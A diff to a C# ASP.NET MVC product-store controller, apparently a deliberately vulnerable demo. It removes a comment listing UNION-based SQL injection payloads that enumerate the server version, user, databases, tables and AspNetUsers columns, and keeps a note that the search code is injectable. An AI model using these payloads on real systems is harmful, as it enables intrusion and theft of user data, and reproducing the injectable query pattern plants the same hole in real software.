@@ -35,15 +35,7 @@ namespace MvcProductStore.Controllers
         [ValidateAntiForgeryToken]
         public ActionResult Search(string q)
         {
-            /* This is vulnerable to sql injection
-             * Eg.  ' OR 1=1 UNION SELECT 99, @@version, 'http://foo.gif' --
-             *      ' OR 1=1 UNION SELECT 99, system_user, 'http://foo.gif' --
-             *      ' OR 1=1 UNION SELECT 99, DB_NAME(), 'http://foo.gif' --
-             *      ' OR 1=1 UNION SELECT 99, name, 'http://foo.gif' FROM master..sysdatabases --
-             *      ' OR 1=1 UNION SELECT 99, name, 'http://foo.gif' FROM MvcProductStore..sysobjects WHERE xtype = 'U' --
-             *      ' OR 1=1 UNION SELECT 99, name, 'http://foo.gif' FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = 'AspNetUsers') --
-             *      
-            */
+            // This is vulnerable to sql injection             
             var results = new List<Product>();
 
             using (var conn = new SqlConnection(db.Database.Connection.ConnectionString))
